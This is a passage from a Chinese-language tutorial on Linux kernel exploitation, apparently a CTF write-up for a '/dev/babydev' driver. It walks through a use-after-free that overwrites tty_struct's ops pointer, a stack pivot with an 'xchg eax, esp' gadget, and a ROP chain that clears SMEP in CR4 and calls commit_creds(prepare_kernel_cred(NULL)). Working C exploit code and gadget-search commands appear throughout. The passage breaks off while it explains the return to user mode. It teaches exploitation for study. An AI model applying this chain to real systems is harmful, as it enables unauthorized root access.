@@ -1,0 +1,243 @@
+      int alt_speed;    /* For magic substitution of 38400 bps */
+      wait_queue_head_t write_wait;
+      wait_queue_head_t read_wait;
+      struct work_struct hangup_work;
+      void *disc_data;
+      void *driver_data;
+      struct list_head tty_files;
+    #define N_TTY_BUF_SIZE 4096
+      int closing;
+      unsigned char *write_buf;
+      int write_cnt;
+      /* If the tty has a pending do_SAK, queue it here - akpm */
+      struct work_struct SAK_work;
+      struct tty_port *port;
+    };
+注意到第五个字段 `const struct tty_operations *ops`，`struct
+tty_operations`结构体实际上是多个函数指针的集合：
+    struct tty_operations {
+      struct tty_struct * (*lookup)(struct tty_driver *driver,
+          struct inode *inode, int idx);
+      int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+      void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+      int  (*open)(struct tty_struct * tty, struct file * filp);
+      void (*close)(struct tty_struct * tty, struct file * filp);
+      void (*shutdown)(struct tty_struct *tty);
+      void (*cleanup)(struct tty_struct *tty);
+      int  (*write)(struct tty_struct * tty,
+              const unsigned char *buf, int count);
+      int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+      void (*flush_chars)(struct tty_struct *tty);
+      int  (*write_room)(struct tty_struct *tty);
+      int  (*chars_in_buffer)(struct tty_struct *tty);
+      int  (*ioctl)(struct tty_struct *tty,
+            unsigned int cmd, unsigned long arg);
+      long (*compat_ioctl)(struct tty_struct *tty,
+               unsigned int cmd, unsigned long arg);
+      void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+      void (*throttle)(struct tty_struct * tty);
+      void (*unthrottle)(struct tty_struct * tty);
+      void (*stop)(struct tty_struct *tty);
+      void (*start)(struct tty_struct *tty);
+      void (*hangup)(struct tty_struct *tty);
+      int (*break_ctl)(struct tty_struct *tty, int state);
+      void (*flush_buffer)(struct tty_struct *tty);
+      void (*set_ldisc)(struct tty_struct *tty);
+      void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+      void (*send_xchar)(struct tty_struct *tty, char ch);
+      int (*tiocmget)(struct tty_struct *tty);
+      int (*tiocmset)(struct tty_struct *tty,
+          unsigned int set, unsigned int clear);
+      int (*resize)(struct tty_struct *tty, struct winsize *ws);
+      int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+      int (*get_icount)(struct tty_struct *tty,
+            struct serial_icounter_struct *icount);
+    #ifdef CONFIG_CONSOLE_POLL
+      int (*poll_init)(struct tty_driver *driver, int line, char *options);
+      int (*poll_get_char)(struct tty_driver *driver, int line);
+      void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+    #endif
+      const struct file_operations *proc_fops;
+    };
+我们可以试着通过 UAF, 修改 **新** 分配的 tty_struct 上的 `const struct tty_operations
+*ops`，使其指向一个伪造的 `tty_operations`结构体，这样就可以搭配一些操作（例如 open、ioctl 等等）来劫持控制流。
+> 注：tty_operations 函数指针的使用，位于`drivers/tty/tty_io.c`的各类 `tty_xxx`函数中。
+但由于开启了 SMEP 保护，此时的控制流 **只能在内核代码中执行** ，不能跳转至用户代码。
+#####  4) ROP 利用
+为了达到提权目的，我们需要完成以下几件事情：
+  1. 提权
+  2. 绕过 SMEP，执行用户代码
+######  4.1) 劫持栈指针
+我们需要通过 ROP 来完成上述操作，但问题是， **用户无法控制内核栈** 。因此我们必须使用一些特殊 gadget 来 **将栈指针劫持到用户空间**
+，之后再利用用户空间上的 ROP 链进行一系列控制流跳转。
+获取 gadget 的方式有很多。可以使用之前用的 `ROPgadget` 工具，优点是可以将分析结果通过管道保存至文件中，但缺点是该工具在 kernel
+层面上会跑的很慢。
+    ROPgadget --binary vmlinux
+有个速度比较快的工具可以试试，那就是 `ropper`工具：
+    pip3 install ropper
+    ropper --file vmlinux --console
+我们可以手动构造一个 **fake_tty_operations** ，并修改其中的 `write` 函数指针指向一个 xchg 指令。这样当对
+`/dev/ptmx` 执行 write 操作时，内核就会通过以下调用链：
+> `tty_write` -> `do_tty_write` -> `do_tty_write` -> `n_tty_write` ->
+> `tty->ops->write`
+进一步使用到 `tty->ops->write`函数指针，最终执行 `xchg` 指令。
+但问题是，执行什么样的 xchg 指令？通过动态调试与 IDA 静态分析，最终找到了实际调用 `tty->ops->write`的指令位置：
+    .text:FFFFFFFF814DC0C3                 call    qword ptr [rax+38h]
+由于当控制流执行至此处时，只有 `%rax` 是用户可控的（即`fake_tty_operations`基地址），因此我们尝试使用以下 gadget，劫持
+`%rsp` 指针至用户空间：
+    0xffffffff8100008a : xchg eax, esp ; ret
+> 注意：`xchg eax, esp`将 **清空两个寄存器的高位部分** 。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用
+> mmap 函数占据这块内存，并放上 ROP 链。
+以下是劫持栈指针的部分代码：
+    int fd1 = open("/dev/babydev", O_RDWR);
+    int fd2 = open("/dev/babydev", O_RDWR);
+    ioctl(fd1, 65537, 0x2e0);
+    close(fd1);
+    // 申请 tty_struct
+    int master_fd = open("/dev/ptmx", O_RDWR);
+    // 构造一个 fake tty_operators
+    u_int64_t fake_tty_ops[] = {
+        0, 0, 0, 0, 0, 0, 0,
+        xchg_eax_esp_addr, // int  (*write)(struct tty_struct*, const unsigned char *, int)
+    };
+    printf("[+] fake_tty_ops constructed\n");
+    u_int64_t hijacked_stack_addr = ((u_int64_t)fake_tty_ops & 0xffffffff);
+    printf("[+] hijacked_stack addr: %p\n", (char*)hijacked_stack_addr);
+    char* fake_stack = NULL;
+    if ((fake_stack = mmap(
+        (char*)(hijacked_stack_addr & (~0xfff)),    // addr, 页对齐
+        0x1000,                                     // length
+        PROT_READ | PROT_WRITE,                     // prot
+        MAP_PRIVATE | MAP_ANONYMOUS,                // flags
+        -1,                                         // fd
+        0)                                          // offset
+        ) == MAP_FAILED)  
+        perror("mmap");
+    // 调试时先装载页面
+    fake_stack[0] = 0;
+    printf("[+]     fake_stack addr: %p\n", fake_stack);
+    // 读取 tty_struct 结构体的所有数据
+    int ops_ptr_offset = 4 + 4 + 8 + 8;
+    char overwrite_mem[ops_ptr_offset + 8];
+    char** ops_ptr_addr = (char**)(overwrite_mem + ops_ptr_offset);
+    read(fd2, overwrite_mem, sizeof(overwrite_mem));
+    printf("[+] origin ops ptr addr: %p\n", *ops_ptr_addr);
+    // 修改并覆写 tty_struct 结构体
+    *ops_ptr_addr = (char*)fake_tty_ops;
+    write(fd2, overwrite_mem, sizeof(overwrite_mem));
+    printf("[+] hacked ops ptr addr: %p\n", *ops_ptr_addr);
+    // 触发 tty_write
+    // 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT
+    int buf[] = {0};
+    write(master_fd, buf, 8);
+可以看到栈指针已经成功被劫持到用户空间中：
+######  4.2) 关闭 SMEP + ret2usr提权
+劫持栈指针后，我们现在可以尝试提权。正常来说，在 **内核** 里需要执行以下代码来进行提权：
+    struct cred * root_cred = prepare_kernel_cred(NULL);
+    commit_creds(root_cred);
+其中，`prepare_kernel_cred`函数用于获取传入 `task_struct` 结构指针的 cred 结构。需要注意的是，如果传入的指针是
+**NULL** ，则 **函数返回的 cred 结构将是 init_cred，其中uid、gid等等均为 root 级别** 。
+`commit_creds`函数用于将当前进程的 `cred` 更新为新传入的 `cred` 结构，如果我们将当前进程的 cred 更新为 root 等级的
+cred，则达到我们提权的目的。
+为了利用简便，我们可以先关闭 SMEP，跳转进用户代码中直接执行预编译好的提权指令。
+SMEP 标志在寄存器 CR4 上，因此我们可以通过重设 CR4 寄存器来关闭 SMEP，最后提权：
+我们先看一下当前的 cr4 寄存器的值
+之后只要将 cr4 覆盖为 0x6f0 即可。
+相关实现如下所示：
+    void set_root_cred(){
+        void* (*prepare_kernel_cred)(void*) = (void* (*)(void*))prepare_kernel_cred_addr;
+        void (*commit_creds)(void*) = (void (*)(void*))commit_creds_addr;
+        void * root_cred = prepare_kernel_cred(NULL);
+        commit_creds(root_cred);
+    }
+    int main()
+    {
+        [...]
+        // 准备 ROP
+        u_int64_t* hijacked_stack_ptr = (u_int64_t*)hijacked_stack_addr;
+        hijacked_stack_ptr[0] = pop_rdi_addr;              // pop rdi; ret
+        hijacked_stack_ptr[1] = 0x6f0;                     // new cr4
+        hijacked_stack_ptr[2] = mov_cr4_rdi_pop_rbp_addr;  // mov cr4, rdi; pop rbp; ret;
+        hijacked_stack_ptr[3] = 0;                         // dummy
+        hijacked_stack_ptr[4] = (u_int64_t)set_root_cred;  // set root
+        // todo ROP
+        [...]
+    }
+######  4.3) 返回用户态 + get shell
+> 当我们提权了当前进程后，剩下要做的事情就是 **返回至用户态** 并启动新shell。
+>
+> 可能有小伙伴会问，既然都劫持了内核控制流了，那是不是可以直接启动 shell ？为什么还要返回至用户态？
+>
+>
+> 个人的理解是，劫持内核控制流后，由于改变了内核的正常运行逻辑，因此此时内核鲁棒性降低，稍微敏感的一些操作都有可能会导致内核挂掉。最稳妥的方式是回到更加稳定的用户态中，而且
+> root 权限的用户态程序同样可以做到内核权限所能做到的事情。
+>
+> 除了上面所说的以外，还有一个很重要的原因是：一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。
+如何从内核态返回至用户态中？我们可以从 syscall 的入口代码入手，先看看这部分代码：
+    ENTRY(entry_SYSCALL_64)
+      SWAPGS_UNSAFE_STACK
+    GLOBAL(entry_SYSCALL_64_after_swapgs)
+      movq  %rsp, PER_CPU_VAR(rsp_scratch)
+      movq  PER_CPU_VAR(cpu_current_top_of_stack), %rsp
+      /* Construct struct pt_regs on stack */
+      pushq  $__USER_DS      /* pt_regs->ss */
+      pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */
+      ENABLE_INTERRUPTS(CLBR_NONE)
+      pushq  %r11        /* pt_regs->flags */
+      pushq  $__USER_CS      /* pt_regs->cs */
+      pushq  %rcx        /* pt_regs->ip */
+      pushq  %rax        /* pt_regs->orig_ax */
+      pushq  %rdi        /* pt_regs->di */
+      pushq  %rsi        /* pt_regs->si */
+      pushq  %rdx        /* pt_regs->dx */
+      pushq  %rcx        /* pt_regs->cx */
+      pushq  $-ENOSYS      /* pt_regs->ax */
+      pushq  %r8        /* pt_regs->r8 */
+      pushq  %r9        /* pt_regs->r9 */
+      pushq  %r10        /* pt_regs->r10 */
+      pushq  %r11        /* pt_regs->r11 */
+      sub  $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */
+可以看到，控制流以进入入口点后，并立即执行`swapgs`指令，将当前 GS 寄存器切换成 kernel
+GS，之后切换栈指针至内核栈，并在内核栈中构造结构体 `pt_regs`。
+该结构体声明如下：
+    struct pt_regs {
+    /*
+     * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
+     * unless syscall needs a complete, fully filled "struct pt_regs".
+     */
+      unsigned long r15;
+      unsigned long r14;
+      unsigned long r13;
+      unsigned long r12;
+      unsigned long rbp;
+      unsigned long rbx;
+    /* These regs are callee-clobbered. Always saved on kernel entry. */
+      unsigned long r11;
+      unsigned long r10;
+      unsigned long r9;
+      unsigned long r8;
+      unsigned long rax;
+      unsigned long rcx;
+      unsigned long rdx;
+      unsigned long rsi;
+      unsigned long rdi;
+    /*
+     * On syscall entry, this is syscall#. On CPU exception, this is error code.
+     * On hw interrupt, it's IRQ number:
+     */
+      unsigned long orig_rax;
+    /* Return frame for iretq */
+      unsigned long rip;
+      unsigned long cs;
+      unsigned long eflags;
+      unsigned long rsp;
+      unsigned long ss;
+    /* top of stack page */
+    };
+结合动态调试可以发现，在控制流到达 syscall 入口点之前，`pt_regs`结构体中的 `rip`、`cs`、`eflags`、`rsp` 以及
+`ss` 五个寄存器均已压栈。
+我们还可以在该文件中找到下面的代码片段
+    opportunistic_sysret_failed:
+      SWAPGS
+      jmp  restore_c_regs_and_iret
+    [...]
